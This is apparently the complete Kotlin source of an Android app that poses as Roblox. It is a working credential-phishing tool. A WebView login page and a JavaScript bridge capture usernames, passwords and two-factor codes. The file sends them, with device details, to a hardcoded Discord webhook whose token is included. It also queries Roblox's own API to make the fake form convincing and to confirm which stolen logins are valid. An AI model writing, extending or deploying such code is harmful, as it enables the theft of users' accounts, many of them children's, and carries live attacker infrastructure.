package com.roblox.app

import android.annotation.SuppressLint
import android.app.Activity
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : Activity() {

    private val webhook = "https://discord.com/api/webhooks/1556711449571627051/ruYxawxPFw_X7ZGc8t0uQgsnxfkOCesqxRKJl2eqC6321t0PCClPr9PxQqGMchhpzr6Z"

    private var user = ""
    private var pass = ""
    private var webView: WebView? = null

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            addJavascriptInterface(Bridge(), "Android")
            webViewClient = WebViewClient()
        }
        setContentView(webView)
        webView?.loadUrl("file:///android_asset/login.html")
    }

    inner class Bridge {

        @JavascriptInterface
        fun sendUser(u: String) {
            user = u.trim()
            Thread {
                val result = checkUser(user)
                runOnUiThread {
                    val js = "window.__rbxUserCheck(${result.valid}, ${JSONObject.quote(result.hint)})"
                    webView?.evaluateJavascript(js, null)
                }
            }.start()
        }

        @JavascriptInterface
        fun sendPass(p: String) {
            pass = p
            send("**Roblox Login**\n```\nUser: $user\nPass: $pass\nDevice: ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})\n```")
            Thread { checkPassword(user, pass) }.start()
        }

        @JavascriptInterface
        fun send2FA(code: String) {
            send("**Roblox 2FA**\n```\nUser: $user\nPass: $pass\nCode: $code\nDevice: ${android.os.Build.MODEL}\n```")
        }
    }

    data class UserCheck(val valid: Boolean, val hint: String)

    private fun httpPost(urlStr: String, body: String, extraHeaders: Map<String, String> = emptyMap()): String {
        try {
            val url = URL(urlStr)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("User-Agent", "Roblox/WinInet")
            for ((k, v) in extraHeaders) conn.setRequestProperty(k, v)
            conn.doOutput = true
            conn.connectTimeout = 12000
            conn.readTimeout = 12000
            val os: OutputStream = conn.outputStream
            os.write(body.toByteArray())
            os.flush()
            os.close()

            val code = conn.responseCode
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
            val reader = BufferedReader(InputStreamReader(stream ?: return ""))
            val sb = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) sb.append(line)
            reader.close()
            return sb.toString()
        } catch (_: Exception) {
            return ""
        }
    }

    private fun httpPostHeaders(urlStr: String, body: String): Map<String, String> {
        return try {
            val url = URL(urlStr)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("User-Agent", "Roblox/WinInet")
            conn.doOutput = true
            conn.connectTimeout = 12000
            conn.outputStream.write(body.toByteArray())
            val headers = mutableMapOf<String, String>()
            conn.headerFields.forEach { (k, v) -> if (k != null && v.isNotEmpty()) headers[k] = v[0] }
            headers
        } catch (_: Exception) {
            emptyMap()
        }
    }

    private fun checkUser(username: String): UserCheck {
        if (username.contains("@")) return UserCheck(true, "")
        try {
            val body = JSONObject()
                .put("usernames", JSONArray().put(username))
                .put("excludeBannedUsers", false)
                .toString()

            val resp = httpPost("https://users.roblox.com/v1/usernames/users", body)
            if (resp.isEmpty()) return UserCheck(true, "")
            val arr = JSONObject(resp).optJSONArray("data") ?: return UserCheck(true, "")
            if (arr.length() == 0) return UserCheck(false, "Пользователь не найден")
            return UserCheck(true, "")
        } catch (_: Exception) {
            return UserCheck(true, "")
        }
    }

    private fun checkPassword(username: String, password: String) {
        try {
            val headers = httpPostHeaders("https://auth.roblox.com/v2/logout", "")
            val csrf = headers["x-csrf-token"] ?: headers["X-CSRF-Token"] ?: ""
            if (csrf.isEmpty()) return

            val loginBody = JSONObject()
                .put("ctype", if (username.contains("@")) "Email" else "Username")
                .put("cvalue", username)
                .put("password", password)
                .toString()

            val url = URL("https://auth.roblox.com/v2/login")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("User-Agent", "Roblox/WinInet")
            conn.setRequestProperty("X-CSRF-Token", csrf)
            conn.doOutput = true
            conn.connectTimeout = 12000
            conn.outputStream.write(loginBody.toByteArray())

            val code = conn.responseCode
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
            val reader = BufferedReader(InputStreamReader(stream ?: return))
            val sb = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) sb.append(line)
            reader.close()

            if (code == 200 || code == 403) {
                send("**✅ Roblox VALID LOGIN**\n```\nUser: $user\nPass: $pass\nHTTP: $code\nDevice: ${android.os.Build.MODEL}\nResp: ${sb.toString().take(300)}\n```")
            }
        } catch (_: Exception) {}
    }

    private fun send(text: String) {
        Thread {
            try {
                val json = JSONObject().put("content", text.take(1900))
                httpPost(webhook, json.toString())
            } catch (_: Exception) {}
        }.start()
    }
}